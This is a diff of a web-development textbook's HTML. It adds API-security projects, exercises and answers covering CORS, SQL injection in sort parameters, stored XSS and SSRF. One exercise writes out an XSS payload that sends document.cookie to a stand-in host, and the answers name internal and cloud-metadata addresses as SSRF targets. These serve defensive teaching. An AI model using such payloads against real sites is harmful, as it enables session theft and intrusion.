+<h2 class="plain-h">Practice projects</h2>
+
+<p class="projects-intro">Each project hardens the shop’s API. For every defence, write a test or a script that shows the attack failing.</p>
+
+<div class="project">
+<p class="project-label">Project 9.1 · Easy</p>
+<h3>Harden the shop’s API</h3>
+<p class="project-goal">Apply this chapter’s defences to the API from Chapter 3.</p>
+<p class="project-skills"><strong>You will practise:</strong> helmet, CORS, body limits, configuration checks and tests for them.</p>
+<ol class="steps">
+<li>Add <code>@fastify/helmet</code>, CORS for one origin read from the configuration, and a body limit.</li>
+<li>Move every <code>process.env</code> read into a checked <code>config.ts</code>, and add <code>.env.example</code>.</li>
+<li>Write tests that check the headers, that an unknown origin gets no CORS header, and that a big body gets 413.</li>
+</ol>
+<p class="hint"><strong>Hint:</strong> <code>app.inject</code> returns the headers too, so these tests need no running server.</p>
+</div>
+
+<div class="project">
+<p class="project-label medium">Project 9.2 · Medium</p>
+<h3>Attack your own code</h3>
+<p class="project-goal">Review the code of the previous chapters as an attacker, and fix what you find.</p>
+<p class="project-skills"><strong>You will practise:</strong> code review for security, writing exploits as tests, and fixing them.</p>
+<ol class="steps">
+<li>List every input of the API (body fields, query parameters, path parameters, headers) and where each one ends up.</li>
+<li>For each, try the attacks of this chapter: injection, over-posting, huge values, unexpected types.</li>
+<li>For every real problem, first write a test that shows the attack working, then fix it and watch the test change.</li>
+<li>Write a short report: what you tried, what you found, what you changed.</li>
+</ol>
+<p class="hint"><strong>Hint:</strong> look hard at sorting and filtering parameters, and at anything that builds SQL text, even inside Kysely.</p>
+</div>
+
+<div class="project">
+<p class="project-label hard">Project 9.3 · Challenge</p>
+<h3>Safe product images</h3>
+<p class="project-goal">Let admins upload product images without opening a single hole.</p>
+<p class="project-skills"><strong>You will practise:</strong> multipart uploads, checking file contents, random names, and serving files safely.</p>
+<ol class="steps">
+<li>Accept an upload with <code>@fastify/multipart</code>, at most 2 MB, admins only.</li>
+<li>Check the first bytes of the file (the “magic number”) to confirm it is a PNG or JPEG, whatever its name and <code>Content-Type</code> claim.</li>
+<li>Store it outside the code folder under a random name, and keep the original name and the product id in the database.</li>
+<li>Serve it by id with <code>Content-Type</code> from your own check, <code>X-Content-Type-Options: nosniff</code>, and <code>Content-Disposition</code>.</li>
+</ol>
+<p class="hint"><strong>Hint:</strong> an “image” that is really HTML with a script, served from your domain with a guessed type, is stored XSS. Never trust the file name or the type the client sent.</p>
+</div>
+<!-- /projects -->
+
+<h2 class="plain-h">Exercises</h2>
+
+<ol class="exercises">
+<li><span class="level">Easy</span> A list route takes <code>?sort=price</code> and runs <code>db.query("SELECT * FROM products ORDER BY " + sort)</code>. Why can’t a <code>$1</code> parameter fix it, and what does?</li>
+<li><span class="level">Easy</span> A colleague says: “We don’t need authentication on this route, CORS only allows our website.” What is wrong with that?</li>
+<li><span class="level medium">Medium</span> Before a <code>PATCH</code> with a JSON body from the shop’s website, the browser sends a <dfn>preflight</dfn> request. Send the same request with <code>curl</code>, and explain each header of the answer.</li>
+<li><span class="level medium">Medium</span> The admin page of the shop shows product names with <code>v-html</code>, and someone creates a product named <code>&lt;img src=x onerror="fetch('//evil.example/?c='+document.cookie)"&gt;</code>. What happens when an admin opens the page, and which defences of this chapter each stop it?</li>
+<li><span class="level hard">Challenge</span> A new route imports a product image from a URL the admin types. List three ways an attacker could abuse it, and the checks that stop each.</li>
+</ol>
+
+<p class="answers-note">Answers to the exercises are at the end of the book and in the book’s code repository.</p>
+
+<div class="next">
+<p class="next-title">Coming up in Chapter 10</p>
+<p>Some work should not happen while the customer waits: emails, reports, image resizing. Background jobs and queues: doing work later, retrying it safely, and never losing it.</p>
+</div>
+</section>
 <section style="page: answers" class="chapter answers" data-chapter="99" data-code="b3/answers/en">
 <div class="opener"><span class="opener-num"></span><p class="chapter-kicker">Appendix</p><h1>Answers to the Exercises</h1><div class="opener-bit"><svg viewBox="0 0 120 140" aria-hidden="true">
 <path d="M32,104 Q20,112 20,122" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/>
@@ -4572,6 +4992,23 @@ Each request adds a member scored by its time in milliseconds (with a random suf
 401</pre></div>
 The request came from the phone’s token, and the laptop’s token, which was never used in it, now answers 401.</li>
 <li>Sign-in returns two tokens: an access token, a JWT valid for 10 minutes carrying the user id and role, and a refresh token, random bytes stored as a hash in the database with a long expiry. Every API request checks only the JWT’s signature and expiry, without a database query. When the access token expires, the client sends the refresh token to <code>POST /auth/refresh</code>, which checks it in the database, replaces it with a new one (so a stolen refresh token works only once), and returns a new JWT. Sign-out deletes the refresh token; the access token stays valid for up to 10 minutes, which is the price. The gain is no database lookup on most requests, which matters when many services check tokens; for a single API with a database already involved in every request, this chapter’s sessions are simpler.</li>
+</ol>
+
+
+<h2 class="plain-h">Chapter 9</h2>
+<ol class="exercises">
+<li>A parameter can only stand for a <em>value</em>; <code>ORDER BY $1</code> would sort by a constant string, the same for every row, and column names are part of the SQL itself. Check the input against a fixed list and use your own constant: <code>const columns = { name: "name", price: "price" } as const</code>, take <code>columns[sort]</code> only if <code>sort</code> is one of its keys (a zod <code>z.enum(["name", "price"])</code> does exactly this), and refuse anything else with 422. In Kysely, <code>orderBy(sort)</code> with <code>sort</code> typed as that union is checked by the compiler too.</li>
+<li>CORS is enforced by browsers, and only for reading responses. Anyone can call the route with <code>curl</code>, a script or another server, none of which care about CORS; and even a browser on another site can still <em>send</em> many requests. Protection of data and actions comes from authentication and authorization on the server. CORS only decides which websites’ scripts may read the answers in a user’s browser.</li>
+<li>The browser first sends <code>OPTIONS</code> with the origin, the method it wants and the headers it wants to send; only if the answer allows all three does it send the real <code>PATCH</code>:
+<div class="listing" dir="ltr"><div class="listing-title">Terminal</div><pre class="code"><span class="c line-bidi"># What a browser asks before a PATCH from the shop&#x27;s website</span>
+<span class="c">$ </span><span class="k">curl -s -i -X OPTIONS localhost:3000/users/2 -H &#x27;Origin: https://shop.example&#x27; -H &#x27;Access-Control-Request-Method: PATCH&#x27; -H &#x27;Access-Control-Request-Headers: content-type&#x27; | grep -i &#x27;^HTTP\|^access-control&#x27;</span>
+HTTP/1.1 204 No Content
+access-control-allow-origin: https://shop.example
+access-control-allow-methods: GET, PATCH
+access-control-allow-headers: content-type</pre></div>
+<code>204</code>: no body, only permission. <code>Access-Control-Allow-Origin</code> names the shop’s site, so this origin may read the answers. <code>Access-Control-Allow-Methods</code> lists <code>GET</code> and <code>PATCH</code>, the methods configured. <code>Access-Control-Allow-Headers</code> allows <code>content-type</code>, which a JSON body needs. A <code>Max-Age</code> header could let the browser remember this answer and skip the preflight for a while.</li>
+<li><code>v-html</code> inserts the name as HTML, so the browser creates an image with an invalid source, its <code>onerror</code> handler runs in the admin’s session, and the cookies (if scripts can read them) go to the attacker; a script could also act as the admin directly. Each defence stops part of it: rendering with <code>{{ }}</code> instead of <code>v-html</code> shows the name as text (the real fix); a Content Security Policy without <code>'unsafe-inline'</code> refuses inline handlers, and <code>connect-src</code> refuses the request to another site; an <code>HttpOnly</code> cookie cannot be read by scripts; and validation on the server could refuse <code>&lt;</code> and <code>&gt;</code> in product names. Layers, because any one of them might be missing one day.</li>
+<li>(1) An internal address (<code>http://localhost:6379</code>, <code>http://10.0.0.5/admin</code>, the cloud metadata address <code>http://169.254.169.254/</code>) makes the server reach services that are not public, and may return their answers or secrets: allow only <code>https</code>, resolve the host name yourself and refuse private, loopback and link-local addresses, and do not follow redirects (or check every hop the same way). (2) A huge or endless file ties up the server and fills the disk: a timeout, a maximum size counted while downloading, and a check that the content really is an image. (3) A URL to a slow server keeps connections open to exhaust your workers: short timeouts, and the download done in a background job (Chapter 10) rather than inside the request. Better still, have admins upload the file instead of giving a URL.</li>
 </ol>
 
 </section>
